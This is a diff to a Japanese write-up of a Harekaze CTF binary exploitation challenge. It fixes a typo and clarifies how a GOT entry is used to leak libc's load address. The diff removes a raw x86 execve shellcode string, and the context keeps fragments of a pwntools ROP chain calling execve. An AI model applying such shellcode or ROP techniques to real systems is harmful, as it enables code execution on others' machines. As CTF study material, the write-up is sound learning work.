@@ -115,9 +115,6 @@ s += pwn.p64(0x0)
 s += pwn.p64(addr_execve)
 
 sys.stdout.buffer.write(s)
-```python
-
-b"\x68\x2f\x6c\x73\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80"
 ```
 
 ### アドレスのリーク
@@ -175,7 +172,7 @@ $ objdump -d libc.so.6 | grep printf | egrep "^0"
 0000000000076d50 <obstack_printf@@GLIBC_2.2.5>:
 ```
 
-Harekaze CTFが終わってから、あ、start_mainのGOTアドエスが安定じゃん、と思いついて解いたらあっさりflagゲット。
+Harekaze CTFが終わってから、あ、start_mainのGOTアドレスが安定じゃん、と思いついて解いたらあっさりflagゲット。
 やってしまった...
 
 ### 最終プログラム
@@ -292,7 +289,8 @@ addr_welcome = 0x400770
 
 libcのロードアドレスリーク用のGOTアドレス。
 GOTアドレスは実行時に動的に値が設定される。
-objdump -dのコメントで見つけることができる。
+GOTアドレス自体はobjdump -dのコメントで見つけることができる。
+この0x601028のアドレスにlibc_start_mainがロードされているアドレスが実行時に書き込まれる。
 
 
 ```bash-statement
